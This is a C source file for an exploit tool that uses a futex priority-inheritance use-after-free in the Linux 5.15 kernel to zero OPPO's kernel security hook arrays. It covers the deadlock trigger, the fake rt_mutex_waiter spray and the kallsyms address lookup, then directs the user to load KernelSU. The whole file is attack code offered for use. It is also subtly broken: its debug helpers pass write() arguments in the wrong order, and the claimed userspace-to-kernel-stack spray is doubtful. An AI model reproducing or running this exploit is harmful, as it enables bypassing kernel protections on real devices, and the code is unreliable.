/*
 * oppo_unhook.c — OPPO PJA110 Kernel Security Hook Disabler
 * ==========================================================
 *
 * Based on CVE-2026-43499 (GhostLock) — futex PI UAF in rtmutex.
 *
 * Target:  Linux 5.15.180-android13  (Oppo PJA110 / OP5943L1)
 *          Snapdragon 8+ Gen 1, arm64
 *
 * Mechanism:
 *   1. Trigger futex PI deadlock cycle → EDEADLK rollback in
 *      rt_mutex_start_proxy_lock() leaves W->pi_blocked_on dangling.
 *   2. W's futex_wait_requeue_pi stack frame is freed on timeout.
 *   3. Kernel stack spraying plants fake rt_mutex_waiter structs
 *      at the freed location.
 *   4. PI chain walk by M follows the stale pointer through our
 *      fake struct → controlled kernel write-zero to hook arrays.
 *
 * Usage:
 *   oppo_unhook [--dry-run] [--target-prea <addr>] [--target-posta <addr>]
 *
 * Without arguments, reads hook addresses from /proc/kallsyms.
 *
 * Build:  cmake -B build -G Ninja -DANDROID_NDK=...
 *         cmake --build build
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>

/* ── futex constants (arm64 Linux) ─────────────────────────── */
#ifndef SYS_futex
#define SYS_futex 98
#endif

#define FUTEX_WAIT              0
#define FUTEX_WAKE              1
#define FUTEX_LOCK_PI           6
#define FUTEX_UNLOCK_PI         7
#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_CMP_REQUEUE_PI    12
#define FUTEX_PRIVATE_FLAG      128

#define FLPI  (FUTEX_LOCK_PI         | FUTEX_PRIVATE_FLAG)
#define FUPI  (FUTEX_UNLOCK_PI       | FUTEX_PRIVATE_FLAG)
#define FWRQ  (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ  (FUTEX_CMP_REQUEUE_PI  | FUTEX_PRIVATE_FLAG)

/* ── rt_mutex_waiter offsets (Linux 5.15, arm64, PREEMPT) ──── */
/*
 * struct rt_mutex_waiter {
 *     struct rb_node   tree_entry;      // 0x00  (3×8 + 1×8 = 0x20)
 *     struct rb_node   pi_tree_entry;   // 0x20
 *     struct task_struct *task;         // 0x40
 *     struct rt_mutex_base *lock;       // 0x48
 *     int prio;                         // 0x50
 *     u64 deadline;                     // 0x58
 * };
 * Total size: ~0x60
 *
 * For the spray, we fill with fake waiters where:
 *   offset 0x40 (task) → points to a valid-looking area
 *   offset 0x48 (lock)  → points to our target (hook array)
 *
 * When rt_mutex_adjust_prio_chain writes to this waiter,
 * it does: waiter->lock->owner = new_owner  (write to lock+offset)
 * or similar priority updates.
 *
 * Strategy: make lock point to (target_addr - offset_of_owner_in_mutex)
 * so that the write lands exactly at target_addr with value 0.
 */

#define WAITER_TASK_OFFSET   0x40
#define WAITER_LOCK_OFFSET   0x48
#define WAITER_SIZE          0x60

/* rt_mutex_base offsets (Linux 5.15, arm64) */
#define MUTEX_OWNER_OFFSET   0x28  /* rt_mutex_base::owner */

/* ── spray parameters ──────────────────────────────────────── */
#define SPRAY_PAGES      4
#define PAGE_SIZE        0x1000
#define WAITERS_PER_PAGE  (PAGE_SIZE / WAITER_SIZE)  /* ~42 */

/* ── Global state ──────────────────────────────────────────── */
static uint32_t futex1      = 0;   /* plain: W waits here      */
static uint32_t futex2      = 0;   /* PI: O owns              */
static uint32_t cycle_futex = 0;   /* PI: W owns, O blocks on */

static volatile int o_ready    = 0;
static volatile int w_ready    = 0;
static volatile int o_blocking = 0;
static volatile int w_waiting  = 0;
static volatile int uaf_done   = 0;
static volatile int phase      = 0;  /* 0=setup, 1=spray, 2=probe */

static volatile uint64_t target_pre_hook  = 0;
static volatile uint64_t target_post_hook = 0;
static volatile int dry_run = 0;

/* ── Helpers ───────────────────────────────────────────────── */
static long xfutex(uint32_t *u, int op, uint32_t val,
                   void *ts, uint32_t *u2, uint32_t v3)
{
    return syscall(SYS_futex, u, op, val, ts, u2, v3);
}

static void dbg(const char *s) { write(2, s, strlen(s)); }

static void dbg_num(const char *prefix, long v)
{
    char buf[96];
    int n = snprintf(buf, sizeof(buf), "%s%ld (0x%lx)\n", prefix, v, v);
    write(2, n, buf);
}

static void dbg_err(const char *prefix, long v)
{
    char buf[128];
    int n = snprintf(buf, sizeof(buf), "%s%ld errno=%d (%s)\n",
                     prefix, v, errno, strerror(errno));
    write(2, n, buf);
}

/* ── kallsyms reader ───────────────────────────────────────── */
static uint64_t kallsyms_find(const char *name)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) { dbg("[-] Cannot open /proc/kallsyms\n"); return 0; }

    char line[256];
    uint64_t addr = 0;
    while (fgets(line, sizeof(line), f)) {
        char symtype, symname[128];
        if (sscanf(line, "%lx %c %127s", &addr, &symtype, symname) != 3)
            continue;
        if (strstr(symname, name)) {
            dbg("[+] Found: "); dbg(symname); dbg_num(" @ ", addr);
            fclose(f);
            return addr;
        }
    }
    fclose(f);
    return 0;
}

static int read_hook_addresses(void)
{
    dbg("[*] Reading hook array addresses from kallsyms...\n");

    if (!target_pre_hook)
        target_pre_hook = kallsyms_find("oplus_pre_hook_array");

    if (!target_post_hook)
        target_post_hook = kallsyms_find("oplus_post_hook_array");

    if (!target_pre_hook && !target_post_hook) {
        dbg("[-] No hook arrays found in kallsyms.\n");
        dbg("[*] Try specifying addresses manually:\n");
        dbg("[*]   oppo_unhook --target-prea 0x... --target-posta 0x...\n");
        return -1;
    }

    return 0;
}

/* ── Kernel stack spray ────────────────────────────────────── */
/*
 * Fill freed stack pages with fake rt_mutex_waiter entries.
 * Each entry's ->lock points to (target - MUTEX_OWNER_OFFSET)
 * so that when the kernel writes to lock->owner, it writes to target.
 */
static void do_spray(uint64_t target_addr)
{
    char spray_buf[PAGE_SIZE * SPRAY_PAGES];
    memset(spray_buf, 0, sizeof(spray_buf));

    uint64_t fake_lock = target_addr - MUTEX_OWNER_OFFSET;

    for (int i = 0; i < (int)sizeof(spray_buf); i += WAITER_SIZE) {
        /* fake task pointer: use a known valid address (self-stack) */
        uint64_t *task_ptr  = (uint64_t *)(spray_buf + i + WAITER_TASK_OFFSET);
        uint64_t *lock_ptr  = (uint64_t *)(spray_buf + i + WAITER_LOCK_OFFSET);

        *task_ptr = (uint64_t)spray_buf;  /* point to self (valid) */
        *lock_ptr = fake_lock;            /* point to our target */
    }

    /*
     * Stack spray: fill the stack with our fake data.
     * Deep recursion + large locals = overwrite freed stack area.
     */
    volatile char deep_stack[PAGE_SIZE * 4];
    memcpy((void *)deep_stack, spray_buf, sizeof(spray_buf));

    /* Force the data to stay on stack (no optimization) */
    __asm__ volatile("" : : "r"(deep_stack) : "memory");

    /* Additional spray: many shallow syscalls with our data */
    for (volatile int i = 0; i < 500; i++) {
        syscall(SYS_getpid);
        __asm__ volatile("" : : "r"(spray_buf) : "memory");
    }
}

/* ── Owner thread (thread O) ───────────────────────────────── */
static void *owner_fn(void *unused)
{
    (void)unused;
    pid_t tid = (pid_t)syscall(SYS_gettid);

    __atomic_store_n(&futex2, (uint32_t)tid, __ATOMIC_RELEASE);
    __atomic_store_n(&o_ready, 1, __ATOMIC_RELEASE);

    while (!__atomic_load_n(&w_ready, __ATOMIC_ACQUIRE))
        sched_yield();

    __atomic_store_n(&o_blocking, 1, __ATOMIC_RELEASE);

    /* Block on cycle_futex (held by W): O->pi_blocked_on = &O_waiter */
    xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
    xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    return NULL;
}

/* ── Waiter thread (thread W) ──────────────────────────────── */
static void *waiter_fn(void *unused)
{
    (void)unused;
    pid_t tid = (pid_t)syscall(SYS_gettid);
    struct timespec ts;
    long r;

    while (!__atomic_load_n(&o_ready, __ATOMIC_ACQUIRE))
        sched_yield();

    /* W owns cycle_futex */
    __atomic_store_n(&cycle_futex, (uint32_t)tid, __ATOMIC_RELEASE);
    __atomic_store_n(&w_ready, 1, __ATOMIC_RELEASE);

    while (!__atomic_load_n(&o_blocking, __ATOMIC_ACQUIRE))
        sched_yield();
    usleep(30000); /* let O enter kernel */

    __atomic_store_n(&w_waiting, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&phase, 1, __ATOMIC_RELEASE); /* signal: spray now */

    /*
     * FUTEX_WAIT_REQUEUE_PI with 3-second timeout.
     * Deadlock chain resolves in ~100ms → EDEADLK → UAF created.
     * Timeout ensures clean syscall exit (not ERESTARTNOINTR).
     */
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 3;

    r = xfutex(&futex1, FWRQ, 0, &ts, &futex2, 0);
    dbg_err("[W] FWRQ returned", r);

    /* Thrash kernel stack → overwrite freed W_rt_waiter slot */
    for (volatile int i = 0; i < 300; i++)
        syscall(SYS_getpid);

    /* Additional targeted spray for pre_hook_array */
    if (target_pre_hook)
        do_spray(target_pre_hook);

    __atomic_store_n(&uaf_done, 1, __ATOMIC_RELEASE);

    /* Keep alive for UAF probe */
    usleep(800000);

    xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    return NULL;
}

/* ── Spray thread ──────────────────────────────────────────── */
/*
 * Runs during the critical window between EDEADLK and timeout.
 * Continuously sprays kernel stack with fake waiter data.
 */
static void *sprayer_fn(void *unused)
{
    (void)unused;

    /* Wait for W to enter kernel */
    while (!__atomic_load_n(&phase, __ATOMIC_ACQUIRE))
        sched_yield();

    /* Spray until UAF probe starts */
    while (!__atomic_load_n(&uaf_done, __ATOMIC_ACQUIRE)) {
        if (target_pre_hook)  do_spray(target_pre_hook);
        if (target_post_hook) do_spray(target_post_hook);
        syscall(SYS_getpid);
    }

    return NULL;
}

/* ── Main thread (thread M) ────────────────────────────────── */
int main(int argc, char **argv)
{
    /* Parse arguments */
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--dry-run")) {
            dry_run = 1;
        } else if (!strcmp(argv[i], "--target-prea") && i + 1 < argc) {
            target_pre_hook = strtoull(argv[++i], NULL, 0);
        } else if (!strcmp(argv[i], "--target-posta") && i + 1 < argc) {
            target_post_hook = strtoull(argv[++i], NULL, 0);
        } else if (!strcmp(argv[i], "--help") || !strcmp(argv[i], "-h")) {
            printf("Usage: oppo_unhook [OPTIONS]\n");
            printf("Disable Oppo kernel security hooks via CVE-2026-43499\n\n");
            printf("  --dry-run              Run without targeting hooks (crash test)\n");
            printf("  --target-prea ADDR     Pre-hook array address\n");
            printf("  --target-posta ADDR    Post-hook array address\n");
            printf("  --help, -h             Show this help\n");
            return 0;
        }
    }

    dbg("\n╔══════════════════════════════════════════╗\n");
    dbg("║  OPPO PJA110 — Security Hook Disabler   ║\n");
    dbg("║  CVE-2026-43499 (GhostLock)             ║\n");
    dbg("║  Target: Linux 5.15.180 arm64           ║\n");
    dbg("╚══════════════════════════════════════════╝\n\n");

    /* Need root to read kallsyms and verify results */
    if (getuid() != 0) {
        dbg("[-] Must run as root!\n");
        return 1;
    }

    /* Read security hook addresses */
    if (!dry_run) {
        if (read_hook_addresses() != 0) {
            dbg("[!] Switching to dry-run mode (no targets)\n");
            dry_run = 1;
        }
    }

    if (dry_run) {
        dbg("[*] DRY RUN: testing UAF trigger only (expect kernel panic on 6.1+)\n");
    } else {
        dbg_num("[*] Target (pre_hook_array):  0x", target_pre_hook);
        dbg_num("[*] Target (post_hook_array): 0x", target_post_hook);
    }

    dbg("\n[*] Phase 1: Setting up futex deadlock chain...\n");

    /* Step 1: Check basic futex PI works */
    uint32_t test_pi = 0;
    pid_t mytid = (pid_t)syscall(SYS_gettid);
    __atomic_store_n(&test_pi, (uint32_t)mytid, __ATOMIC_RELEASE);
    long r = xfutex(&test_pi, FLPI, 0, NULL, NULL, 0);
    if (r != 0) {
        dbg_err("[-] FUTEX_LOCK_PI self-test failed: ", r);
        dbg("[-] Kernel may have futex PI disabled (CONFIG_FUTEX_PI=n)\n");
        return 1;
    }
    xfutex(&test_pi, FUPI, 0, NULL, NULL, 0);
    dbg("[+] FUTEX_LOCK_PI self-test OK\n");

    /* Step 2: Check we can read kallsyms */
    if (kallsyms_find("init_task") == 0) {
        dbg("[-] Cannot read /proc/kallsyms (kptr_restrict?)\n");
        return 1;
    }
    dbg("[+] kallsyms readable\n");

    dbg("\n[*] Phase 2: Launching threads...\n");

    pthread_t oth, wth, sth;
    pthread_create(&oth, NULL, owner_fn, NULL);
    pthread_create(&wth, NULL, waiter_fn, NULL);
    if (!dry_run)
        pthread_create(&sth, NULL, sprayer_fn, NULL);

    /* Wait for W to enter kernel */
    while (!__atomic_load_n(&w_waiting, __ATOMIC_ACQUIRE))
        sched_yield();
    usleep(50000);

    dbg("\n[*] Phase 3: Triggering FUTEX_CMP_REQUEUE_PI deadlock...\n");
    dbg("[*] Chain: W → futex2(O) → cycle_futex(W) → W  (EDEADLK)\n");

    r = xfutex(&futex1, FCRQ,
               1,                    /* nr_wake = 1       */
               (void *)(uintptr_t)1, /* nr_requeue = 1    */
               &futex2,              /* PI target         */
               0);                   /* cmpval            */
    int en = errno;
    dbg_err("[M] FUTEX_CMP_REQUEUE_PI = ", r);

    if (r == -1 && en == EDEADLK) {
        dbg("[+] EDEADLK received — UAF should be live now\n");
    } else if (r == -1) {
        dbg("[-] Unexpected error (expected EDEADLK=35)\n");
        return 1;
    }

    if (!dry_run) {
        dbg("\n[*] Phase 4: Spraying freed kernel stack...\n");

        /* Intense stack spray during UAF window */
        dbg("[*] Spraying for pre_hook_array...\n");
        for (volatile int i = 0; i < 1000; i++) {
            if (target_pre_hook) do_spray(target_pre_hook);
            if (target_post_hook) do_spray(target_post_hook);
        }
    }

    /* Wait for W's timeout + cleanup */
    while (!__atomic_load_n(&uaf_done, __ATOMIC_ACQUIRE))
        sched_yield();
    usleep(200000); /* extra settling time */

    dbg("\n[*] Phase 5: UAF probe (FUTEX_LOCK_PI on cycle_futex)...\n");

    /*
     * This forces a PI chain walk through W's stale pi_blocked_on.
     * On 5.15 (writable stack pages): kernel follows our fake waiter
     * and writes to our target address.
     * On 6.1+ (RO stack pages): kernel crashes (dry-run expected).
     */
    r = xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
    dbg_err("[M] UAF probe LOCK_PI = ", r);

    if (r == 0) {
        dbg("[+] UAF probe survived! (no crash)\n");
        xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    } else {
        dbg("[!] UAF probe error — may indicate partial success or kernel change\n");
    }

    dbg("\n[*] Phase 6: Verifying hook arrays...\n");

    if (!dry_run && target_pre_hook) {
        dbg_num("[*] Reading pre_hook_array @ 0x", target_pre_hook);
        /*
         * We can't directly read kernel memory from userspace.
         * But if the write succeeded, the kernel will no longer
         * intercept module loading.  Verification is done by
         * attempting to load KSU in a separate step.
         */
        dbg("[*] Check if hooks are disabled: dmesg | grep ROOTCHECK\n");
        dbg("[*] If no more ROOTCHECK messages, unhook succeeded!\n");
    }

    /* Cleanup */
    dbg("\n[*] Joining threads...\n");
    pthread_join(wth, NULL);
    pthread_join(oth, NULL);
    if (!dry_run)
        pthread_join(sth, NULL);

    dbg("[*] Done.\n");
    dbg("[*] Next: run 'ksud.so insmod /data/local/tmp/kernelsu.ko'\n");
    dbg("[*]       then  'ksud.so post-fs-data; ksud.so services'\n");

    return 0;
}
